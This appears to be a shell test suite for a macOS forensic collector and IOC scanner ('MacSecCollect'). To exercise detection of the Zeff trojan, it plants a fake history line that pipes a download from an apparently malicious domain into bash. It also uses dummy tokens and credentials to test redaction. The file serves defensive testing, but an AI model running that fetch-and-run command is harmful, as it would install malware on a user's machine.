#!/bin/bash
# =============================================================================
#  tests/test_collect.sh — Shell 侧可执行测试（Linux/macOS 均可跑）
#
#  重点覆盖：
#    A. 无 GNU timeout 时基础采集仍可运行；超时/错误/成功三态区分
#    B. 权限不足被准确标记，不无限等待
#    C. Zeff IOC 命中/未命中/文件不存在/日志不可读
#    D. checksums 可验证；归档失败不报成功
#
#  这些测试在 Linux 上使用模拟命令，不依赖真实 macOS。
#  真实 macOS 行为需实机验证（见 README「待实机验证」）。
# =============================================================================

set -u
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LIB="$REPO/scripts/lib"
TMPROOT=$(mktemp -d "${TMPDIR:-/tmp}/msc_test.XXXXXX")
PASS=0; FAIL=0; SKIP=0
FAILED_NAMES=""

cleanup() { rm -rf "$TMPROOT" 2>/dev/null; }
trap cleanup EXIT

ok()   { PASS=$((PASS+1)); printf '  \033[32mPASS\033[0m %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); FAILED_NAMES="$FAILED_NAMES\n    - $1: $2"; printf '  \033[31mFAIL\033[0m %s — %s\n' "$1" "$2"; }
skip() { SKIP=$((SKIP+1)); printf '  \033[33mSKIP\033[0m %s — %s\n' "$1" "$2"; }

assert_eq() {
  local name="$1" expect="$2" actual="$3"
  if [ "$expect" = "$actual" ]; then ok "$name"; else bad "$name" "期望 [$expect] 实际 [$actual]"; fi
}

assert_contains() {
  local name="$1" needle="$2" haystack="$3"
  case "$haystack" in *"$needle"*) ok "$name" ;; *) bad "$name" "未包含 [$needle]" ;; esac
}

assert_file() {
  local name="$1" f="$2"
  if [ -f "$f" ]; then ok "$name"; else bad "$name" "文件不存在: $f"; fi
}

echo "══════════════════════════════════════════════════════"
echo " MacSecCollect Shell 测试"
echo " 仓库: $REPO"
echo " 临时目录: $TMPROOT"
echo "══════════════════════════════════════════════════════"

# ─────────────────────────────────────────────────────────
echo ""
echo "── A. 语法与静态检查 ──"
# ─────────────────────────────────────────────────────────
for f in "$REPO"/scripts/*.sh "$LIB"/*.sh; do
  if bash -n "$f" 2>/dev/null; then
    ok "语法 $(basename "$f")"
  else
    bad "语法 $(basename "$f")" "bash -n 失败"
  fi
done

# 禁止再出现裸 timeout 调用（必须走 lib/portable_timeout.sh）
echo ""
echo "── A2. 可移植性：不得依赖 GNU timeout / jq ──"
for f in "$REPO"/scripts/mac_collect_online.sh "$REPO"/scripts/mac_collect_offline.sh; do
  # 排除注释、排除 portable_timeout 内部的可选探测
  hits=$(grep -nE '(^|[^a-zA-Z_-])timeout[[:space:]]+[0-9]' "$f" 2>/dev/null | grep -v '^\s*#' || true)
  if [ -z "$hits" ]; then ok "无裸 timeout 调用 $(basename "$f")"
  else bad "无裸 timeout 调用 $(basename "$f")" "$hits"; fi
done
for f in "$REPO"/scripts/*.sh "$LIB"/*.sh; do
  hits=$(grep -nE 'command -v jq|\| *jq |jq -' "$f" 2>/dev/null | grep -v '^\s*#' || true)
  if [ -z "$hits" ]; then ok "无 jq 依赖 $(basename "$f")"
  else bad "无 jq 依赖 $(basename "$f")" "$hits"; fi
done

# 禁止 sudo 调用（只允许探测性 sudo -n，且不得阻塞）
echo ""
echo "── A3. 权限：不得阻塞式提权 ──"
for f in "$REPO"/scripts/mac_collect_online.sh "$REPO"/scripts/mac_collect_offline.sh; do
  hits=$(grep -nE 'sudo[[:space:]]+-v|sudo[[:space:]]+[a-z]' "$f" 2>/dev/null | grep -v '^\s*#' || true)
  if [ -z "$hits" ]; then ok "无阻塞式 sudo $(basename "$f")"
  else bad "无阻塞式 sudo $(basename "$f")" "$hits"; fi
done
# 允许：sudo -n（非交互探测）、command -v sudo（仅检查存在性）、注释
# 禁止：任何其它形式的 sudo 调用（可能阻塞等密码）
hits=$(grep -nE '(^|[^a-zA-Z_-])sudo[[:space:]]+[^-[:space:]]|(^|[^a-zA-Z_-])sudo[[:space:]]+-[^n[:space:]]' "$LIB/permissions.sh" 2>/dev/null \
  | grep -vE '^[0-9]+:[[:space:]]*#' \
  | grep -vE 'sudo[[:space:]]+-n' \
  | grep -vE 'command[[:space:]]+-v[[:space:]]+sudo' || true)
if [ -z "$hits" ]; then ok "permissions.sh 仅用 sudo -n 探测"
else bad "permissions.sh 仅用 sudo -n 探测" "$hits"; fi

# ─────────────────────────────────────────────────────────
echo ""
echo "── B. 可移植超时：无 timeout/gtimeout 环境 ──"
# ─────────────────────────────────────────────────────────
# 模拟一个 PATH 里没有 timeout 的环境
NATIVE_TIMEOUT_DIR="$TMPROOT/native_bin"
mkdir -p "$NATIVE_TIMEOUT_DIR"
# 构造一个只有必要工具的 PATH（无 timeout）
cat > "$TMPROOT/run_notimeout.sh" <<'EOS'
#!/bin/bash
export MSC_TIMEOUT_TOOL=__none__
. "$1/portable_timeout.sh"
shift
"$@"
EOS
chmod +x "$TMPROOT/run_notimeout.sh"

# B1: 正常完成 → 0
out=$("$TMPROOT/run_notimeout.sh" "$LIB" _msc_pt_exec 5 echo hello 2>&1)
rc=$?
assert_eq "B1 无 timeout 环境正常执行" "0" "$rc"
assert_contains "B1 输出正确" "hello" "$out"

# B2: 超时 → 124
start=$(date +%s)
"$TMPROOT/run_notimeout.sh" "$LIB" _msc_pt_exec 2 sleep 30 >/dev/null 2>&1
rc=$?
elapsed=$(( $(date +%s) - start ))
assert_eq "B2 超时返回 124" "124" "$rc"
if [ "$elapsed" -lt 15 ]; then ok "B2 及时终止 (${elapsed}s，未等满 30s)"
else bad "B2 及时终止" "耗时 ${elapsed}s，疑似未真正超时"; fi

# B3: 命令失败 → 非 0 且非 124
"$TMPROOT/run_notimeout.sh" "$LIB" _msc_pt_exec 5 bash -c 'exit 7' >/dev/null 2>&1
rc=$?
assert_eq "B3 命令失败透传退出码 7" "7" "$rc"

# B4: 不存在的命令 → 126/127
"$TMPROOT/run_notimeout.sh" "$LIB" _msc_pt_exec 5 /nonexistent/binary_xyz >/dev/null 2>&1
rc=$?
if [ "$rc" = "126" ] || [ "$rc" = "127" ]; then ok "B4 不存在的命令返回 $rc"
else bad "B4 不存在的命令" "期望 126/127，实际 $rc"; fi

# B5: 超时后不得遗留子进程
MARKER="msc_test_marker_$$"
"$TMPROOT/run_notimeout.sh" "$LIB" _msc_pt_exec 1 bash -c "sleep 60; echo $MARKER" >/dev/null 2>&1
sleep 2
leftover=$(ps ax 2>/dev/null | grep -F "$MARKER" | grep -v grep | wc -l | tr -d ' ')
assert_eq "B5 超时后无遗留子进程" "0" "${leftover:-0}"

# B6: 管道场景 —— 只杀最外层不应留下实际采集进程
"$TMPROOT/run_notimeout.sh" "$LIB" _msc_pt_exec 1 bash -c 'sleep 45 | cat' >/dev/null 2>&1
sleep 2
leftover=$(ps ax 2>/dev/null | grep -c '[s]leep 45')
assert_eq "B6 管道内进程也被终止" "0" "${leftover:-0}"

# ─────────────────────────────────────────────────────────
echo ""
echo "── C. 模块状态记录 ──"
# ─────────────────────────────────────────────────────────
export MSC_MODULES_FILE="$TMPROOT/modules.tsv"
: > "$MSC_MODULES_FILE"
out=$(bash -c "
  . '$LIB/modules.sh'
  MSC_PHASE=test
  # 模拟真实采集比例：10 个模块中 8 成功、1 超时、1 权限不足
  for n in 1 2 3 4 5 6 7 8; do msc_begin mod\$n; msc_end mod\$n success 0 ok; done
  msc_begin m2; msc_end m2 timed_out 124 '超时'
  msc_begin m3; msc_end m3 permission_denied 1 '无权限'
  msc_begin m4; msc_end m4 success 0 '含tab	和
换行'
  echo overall=\$(msc_overall_status)
" 2>&1)

assert_eq "C1 记录 11 条模块" "11" "$(wc -l < "$MSC_MODULES_FILE" | tr -d ' ')"
assert_contains "C2 timed_out 状态保留" "timed_out" "$(grep m2 "$MSC_MODULES_FILE")"
assert_contains "C3 退出码保留" "124" "$(grep m2 "$MSC_MODULES_FILE")"
assert_contains "C4 summary 中的 tab/换行被清洗" "含tab  和 换行" "$(grep m4 "$MSC_MODULES_FILE")"
# 非关键模块全 success/timed_out → partial
assert_contains "C5 非关键失败 → partial" "overall=partial" "$out"

# 关键模块失败 → incomplete
export MSC_MODULES_FILE="$TMPROOT/modules2.tsv"
: > "$MSC_MODULES_FILE"
out=$(bash -c "
  . '$LIB/modules.sh'
  MSC_PHASE=test
  msc_begin network-connections; msc_end network-connections failed 1 '关键模块失败'
  msc_begin accounts; msc_end accounts success 0 'ok'
  echo overall=\$(msc_overall_status)
" 2>&1)
assert_contains "C6 关键模块失败 → incomplete" "overall=incomplete" "$out"

# 全部成功 → success
export MSC_MODULES_FILE="$TMPROOT/modules3.tsv"
: > "$MSC_MODULES_FILE"
out=$(bash -c "
  . '$LIB/modules.sh'
  MSC_PHASE=test
  msc_begin a; msc_end a success 0 ok
  msc_begin b; msc_end b partial 0 ok
  echo overall=\$(msc_overall_status)
" 2>&1)
assert_contains "C7 全 success/partial → success" "overall=success" "$out"

# 非法状态被纠正
export MSC_MODULES_FILE="$TMPROOT/modules4.tsv"
: > "$MSC_MODULES_FILE"
bash -c "
  . '$LIB/modules.sh'
  MSC_PHASE=test
  msc_begin bad; msc_end bad 'totally_ok' 0 '非法状态'
" >/dev/null 2>&1
assert_contains "C8 非法状态被纠正为 failed" "failed" "$(grep '^bad' "$MSC_MODULES_FILE")"

unset MSC_MODULES_FILE

# ─────────────────────────────────────────────────────────
echo ""
echo "── D. Zeff IOC：命中 / 未命中 / 不存在 ──"
# ─────────────────────────────────────────────────────────
FAKE_HOME="$TMPROOT/fakehome"
mkdir -p "$FAKE_HOME/.ssh" "$FAKE_HOME/Library/LaunchAgents"
mkdir -p "$TMPROOT/evidence/logs" "$TMPROOT/evidence/network"

# D1: 制造一个 /tmp 下的假 installer 文件（不是真实恶意样本）
FAKE_TMP="/tmp/msc_fake_installer_$$"
printf '#!/bin/sh\necho fake\n' > "$FAKE_TMP"
chmod +x "$FAKE_TMP"

# D2: Shell 历史命中
cat > "$FAKE_HOME/.zsh_history" <<'EOH'
ls -la
curl -s 'https://macos.zeff.app/v2/install' | bash
echo done
EOH

# D3: 日志命中
echo "2026-10-19 22:14:03 host kernel[0]: process bash connected to macos.zeff.app" \
  > "$TMPROOT/evidence/logs/unified_log_ioc.txt"

ioc_out=$(HOME="$FAKE_HOME" MSC_EVIDENCE_ROOT="$TMPROOT/evidence" bash -c "
  . '$LIB/ioc.sh'
  MSC_EVIDENCE_ROOT='$TMPROOT/evidence'
  msc_ioc_scan '$REPO/scripts/ioc/zeff.json'
" 2>&1)

assert_contains "D1 IOC 标题正确解析" "Zeff 木马" "$ioc_out"
assert_contains "D2 历史中 curl|bash 命中" "HISTORY_HIT" "$ioc_out"
assert_contains "D3 日志中域名命中" "LOG_HIT" "$ioc_out"
assert_contains "D4 未提供哈希时不编造" "不编造哈希" "$ioc_out"
assert_contains "D5 明确说明未命中≠干净" "不等于系统干净" "$ioc_out"
assert_contains "D6 卷未挂载如实记录" "卷未挂载" "$ioc_out"

# D7: 命中但不得输出「已确诊病毒」这类武断结论
case "$ioc_out" in
  *"确认恶意"*|*"已确诊"*|*"系统已感染"*) bad "D7 不武断下恶意结论" "出现武断措辞" ;;
  *) ok "D7 不武断下恶意结论" ;;
esac

rm -f "$FAKE_TMP"

# D8: 干净环境下的未命中
CLEAN_HOME="$TMPROOT/cleanhome"
mkdir -p "$CLEAN_HOME"
clean_out=$(HOME="$CLEAN_HOME" bash -c "
  . '$LIB/ioc.sh'
  MSC_EVIDENCE_ROOT='$TMPROOT/emptyevidence'
  msc_ioc_scan '$REPO/scripts/ioc/zeff.json'
" 2>&1)
assert_contains "D8 干净环境仍提示限制" "不等于系统干净" "$clean_out"

# D9: 日志目录不可读
mkdir -p "$TMPROOT/noread/logs"
chmod 000 "$TMPROOT/noread/logs" 2>/dev/null
noread_out=$(HOME="$CLEAN_HOME" bash -c "
  . '$LIB/ioc.sh'
  MSC_EVIDENCE_ROOT='$TMPROOT/noread'
  msc_ioc_scan '$REPO/scripts/ioc/zeff.json'
" 2>&1)
chmod 755 "$TMPROOT/noread/logs" 2>/dev/null
if [ -z "$noread_out" ]; then bad "D9 日志不可读时不崩溃" "无输出"
else ok "D9 日志不可读时不崩溃"; fi

# ─────────────────────────────────────────────────────────
echo ""
echo "── E. 证据完整性：checksums 与归档 ──"
# ─────────────────────────────────────────────────────────
EV="$TMPROOT/evidence_pkg"
mkdir -p "$EV/sub"
echo "hello" > "$EV/a.txt"
echo "world" > "$EV/sub/b.txt"

bash -c "
  . '$LIB/evidence.sh'
  msc_write_checksums '$EV'
" >/dev/null 2>&1
assert_file "E1 checksums.sha256 生成" "$EV/checksums.sha256"
assert_eq "E2 清单含 2 个文件" "2" "$(grep -c . "$EV/checksums.sha256" | tr -d ' ')"

verify=$(bash -c "
  . '$LIB/evidence.sh'
  msc_verify_checksums '$EV'
" 2>&1)
assert_contains "E3 校验通过" "VERIFIED:2/2" "$verify"

# E4: 篡改后校验失败
echo "tampered" >> "$EV/a.txt"
verify=$(bash -c "
  . '$LIB/evidence.sh'
  msc_verify_checksums '$EV'
" 2>&1)
assert_contains "E4 篡改被检出" "MISMATCH:a.txt" "$verify"

# E5: 归档生成并可解压
ZIPF="$TMPROOT/pkg.zip"
arch=$(bash -c "
  . '$LIB/evidence.sh'
  msc_archive '$EV' '$ZIPF'
" 2>&1)
if [ -f "$ZIPF" ]; then ok "E5 ZIP 已生成"
else skip "E5 ZIP 已生成" "zip 命令不可用（当前环境）"; fi

if [ -f "$ZIPF" ]; then
  assert_contains "E6 归档返回 ARCHIVE_OK" "ARCHIVE_OK" "$arch"
  # 解压验证
  mkdir -p "$TMPROOT/unzip_test"
  if unzip -q -o "$ZIPF" -d "$TMPROOT/unzip_test" 2>/dev/null; then
    ok "E7 ZIP 可解压"
    if diff -r "$EV" "$TMPROOT/unzip_test/$(basename "$EV")" >/dev/null 2>&1; then
      ok "E8 解压内容与原始一致"
    else bad "E8 解压内容与原始一致" "内容不一致"; fi
  else
    bad "E7 ZIP 可解压" "unzip 失败"
  fi
  # E9: 默认不删除原始目录
  if [ -d "$EV" ]; then ok "E9 打包后保留原始证据目录"
  else bad "E9 打包后保留原始证据目录" "原始目录被删除"; fi

  # E10: 归档失败必须报错（目标路径不可写）
  bad_arch=$(bash -c "
    . '$LIB/evidence.sh'
    msc_archive '$EV' '/nonexistent_dir_xyz/out.zip'
  " 2>&1); rc=$?
  if [ $rc -ne 0 ] && echo "$bad_arch" | grep -q 'ARCHIVE_FAILED'; then
    ok "E10 归档失败明确报错"
  else bad "E10 归档失败明确报错" "rc=$rc out=$bad_arch"; fi
else
  skip "E6-E10 归档相关" "zip 不可用"
fi

# ─────────────────────────────────────────────────────────
echo ""
echo "── F. 脱敏 ──"
# ─────────────────────────────────────────────────────────
# F. 脱敏：用 node 直接跑 lib/privacy.js
# ─────────────────────────────────────────────────────────
if command -v node >/dev/null 2>&1; then
  TMPF=$(mktemp)
  cat > "$TMPF" <<'NODEEOF'
const {redactText} = require(process.argv[2] + "/lib/privacy.js");
const samples = [
  "https://user:pass123@proxy.corp.local:8080",
  "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789",
  "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
  "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig",
  "SLACK=xoxb-1234567890-abcdefghij",
  "normal harmless log line with no secrets",
  "glpat-abcdefghijklmnopqrst"
];
for (const s of samples) console.log(redactText(s).text);
NODEEOF
  san_out=$(node "$TMPF" "$REPO" 2>&1)
  rm -f "$TMPF"
  assert_contains "F1 代理 URL 凭据脱敏" "[REDACTED:" "$(printf '%s\n' "$san_out" | head -1)"
  assert_contains "F2 无害行不被破坏" "normal harmless log line with no secrets" "$san_out"
  case "$san_out" in
    *pass123*) bad "F3 密码未残留" "仍可见 pass123" ;;
    *) ok "F3 密码未残留" ;;
  esac
  case "$san_out" in
    *ghp_abcdefghijklmnopqrstuvwxyz*) bad "F4 token 未残留" "仍可见完整 token" ;;
    *) ok "F4 token 未残留" ;;
  esac
  case "$san_out" in
    *AKIAIOSFODNN7EXAMPLE*) bad "F5 AWS AKID 未残留" "仍可见完整 AKID" ;;
    *) ok "F5 AWS AKID 未残留" ;;
  esac
else
  skip "F1-F5 脱敏" "node 不可用"
fi

# ─────────────────────────────────────────────────────────
echo ""
echo "── G. 版本号单一来源 ──"
# ─────────────────────────────────────────────────────────
if [ -f "$REPO/VERSION" ]; then
  vfile=$(tr -d ' \t\r\n' < "$REPO/VERSION")
  ok "G0 VERSION 文件存在 ($vfile)"
  pkg_ver=$(python3 -c 'import json,sys;print(json.load(open(sys.argv[1]))["version"])' "$REPO/package.json" 2>/dev/null)
  assert_eq "G1 VERSION 与 package.json 一致" "$vfile" "$pkg_ver"

  for f in mac_collect_online.sh mac_collect_offline.sh; do
    if grep -qE '^MSC_VERSION="[0-9]' "$REPO/scripts/$f" 2>/dev/null; then
      bad "G2 $f 未硬编码版本" "仍存在 MSC_VERSION=\"x.y.z\""
    else
      ok "G2 $f 未硬编码版本"
    fi
    rtv=$(bash -c '. "$1/scripts/lib/version.sh"; printf "%s" "$MSC_VERSION"' _ "$REPO" 2>/dev/null)
    assert_eq "G2 $f 运行时版本 = VERSION" "$vfile" "$rtv"
  done

  unk=$(MSC_VERSION_FILE=/nonexistent/VERSION bash -c '. "$1/scripts/lib/version.sh"; printf "%s" "$MSC_VERSION"' _ "$REPO" 2>/dev/null)
  case "$unk" in
    *unknown*) ok "G3 VERSION 缺失时标注 unknown" ;;
    *) bad "G3 VERSION 缺失时标注 unknown" "得到 [$unk]" ;;
  esac
  # 报告里的 tool_version 必须来自版本库
  rtv=$(bash -c '. "$1/scripts/lib/version.sh"; printf "%s" "$MSC_VERSION"' _ "$REPO" 2>/dev/null)
  assert_eq "G4 报告 tool_version 来源一致" "$vfile" "$rtv"
else
  bad "G0 VERSION 文件存在" "缺少 $REPO/VERSION"
fi

echo ""
echo "══════════════════════════════════════════════════════"
printf ' 结果: \033[32m%d 通过\033[0m  \033[31m%d 失败\033[0m  \033[33m%d 跳过\033[0m\n' "$PASS" "$FAIL" "$SKIP"
if [ "$FAIL" -gt 0 ]; then
  printf ' 失败项:\033[31m%b\033[0m\n' "$FAILED_NAMES"
fi
echo "══════════════════════════════════════════════════════"
# 清理测试临时目录
[ -n "${TMPROOT:-}" ] && rm -rf "$TMPROOT" 2>/dev/null
[ "$FAIL" -gt 0 ] && exit 1
exit 0
